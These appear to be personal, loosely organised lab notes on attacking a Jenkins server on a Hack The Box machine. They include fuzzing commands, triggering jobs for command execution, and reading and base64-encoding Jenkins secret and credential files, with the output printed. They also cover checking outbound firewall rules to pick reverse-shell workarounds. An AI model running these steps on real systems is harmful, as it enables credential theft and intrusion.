[[Jenkins]]



  鉴于域名的使用`object.htb`，我将对其他子域名进行模糊测试，但找不到任何子域名：
  ```
 wfuzz -u http://object.htb -H 'Host: FUZZ.object.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 29932
  ```

1158b5cd9f43894a28519d5110803ce243
  [[ICMP]]
  这条命令会立刻让本机**忽略所有 ICMP echo 请求（也就是不再回应 ping）**。下面把细节、检查/恢复与持久化方法都列清楚——方便你在考试/渗透测试里快速用和撤回。

for mac

```BNF
echo "block drop inet proto icmp all" | sudo pfctl -ef - 
```

for kali

```
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

  

So I'm going to add this domain, but since the subdomain isn't showing up. i will explode

```

wfuzz -u http://object.htb -H 'Host: FUZZ.object.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 29932kali
```

```BNF
 curl -I http://titan:tianlhl@10.10.11.132:8080/job/bbb/build\?token\=api
```

- 你在 Job 里选的是 **“Execute Windows batch command”**，所以 Jenkins 把你写的命令丢给 `cmd.exe` 执行。
- 你用了：
    
    ```
    powershell cd C:\Users\oliver\AppData\Local\Jenkins | ls
    
    ```
    
- 但是：
    - `cd` 在 PowerShell 是内置命令没问题；
    - 但 `| ls` 在 **cmd.exe** 里不生效（cmd 不认识 `ls`，它不是 Windows 内置命令）。
    - 所以报错了。

---

### ✅ 正确写法

### 方法 1：整段命令交给 PowerShell

在 Batch Command 里写：

```Bash
powershell -NoProfile -ExecutionPolicy Bypass -Command "cd C:\Users\oliver\AppData\Local\Jenkins; Get-ChildItem"
```

  
to find the jenkins, need get his path
## 通过环境变量查看 Jenkins Home

Jenkins 安装通常会在环境变量里设置 `JENKINS_HOME`：

```PowerShell
powershell -NoProfile -Command "Get-ChildItem Env:JENKINS_HOME"
```

find the home , then list them

```Bash
powershell -NoProfile -Command "Get-ChildItem 'C:\Users\oliver\AppData\Local\Jenkins\.jenkins' -Force | Select-Object Name,FullName"
```
- 便于通过文本通道（例如 HTTP 参数、日志、电子邮件）传输二进制或包含特殊字符的文件内容。
    
- 便于在远端把文件抓下来，再通过 base64 解码还原成原始文件。

```
PS > [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("blahblah"))
nV�nV�

PS > [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("nVnV"))
blZuVg==
```

```
powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\credentials.xml'))"
powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key'))"
powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret'))"
```

find two, need 3

```Bash
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\bbb>powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\credentials.xml'))" 
Exception calling "ReadAllBytes" with "1" argument(s): "Could not find file 
'C:\Users\oliver\AppData\Local\Jenkins\.jenkins\credentials.xml'."
At line:1 char:1
+ [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\Ap ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : FileNotFoundException
 

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\bbb>powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key'))" 
ZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFkZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5ZTJiZjBjNzZmZTMxZGIxOQ==

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\bbb>powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret'))" 
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```

```
 echo "ZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFkZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5ZTJiZjBjNzZmZTMxZGIxOQ==" | base64 -d > master.key
```

check the fold

```Bash
powershell -NoProfile -Command "Get-ChildItem 'C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users' -Force | ForEach-Object { $_.FullName }"
```

```Bash
powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\titan_14012995377028264036\config.xml'))"
```

```
copy C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secret\master.key  C:\Users\oliver\AppData\Local\Jenkins\war\robots.txt
```

powershell base64

  

```Bash
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('blahblab64'))

PS > [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("string"))
```

- **排障**：如果你发现某些应用无法访问网络，先看看是不是有阻止出站的规则。from guess to verify 
    
- **渗透/红队/考试**（如 OSCP）：
    
    - 有些靶机可能配置了防火墙阻止反向 shell 或特定端口的出站流量。
        
    - 查看出站阻断规则，有助于判断你该用正向 shell、HTTP(s) beacon、DNS 隧道等绕过方式。

```
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block

```
- **Get-NetFirewallRule**  
    Windows 防火墙模块里的 cmdlet，用来获取系统中定义的防火墙规则。
    
- **-Direction Outbound**  
    只列出 **出站** 规则（即从本机发往外部的流量）。
    
- **-Enabled True**  
    只显示启用中的规则。
    
- **-Action Block**  
    只显示操作为 **阻止** 的规则。

```
powershell -NoProfile -Command "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($_ | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($_ | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($_ | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($_ | Get-NetFirewallAddressFilter).RemoteAddress}},Enabled,Profile,Direction,Action"

```

[[evil-winrm]]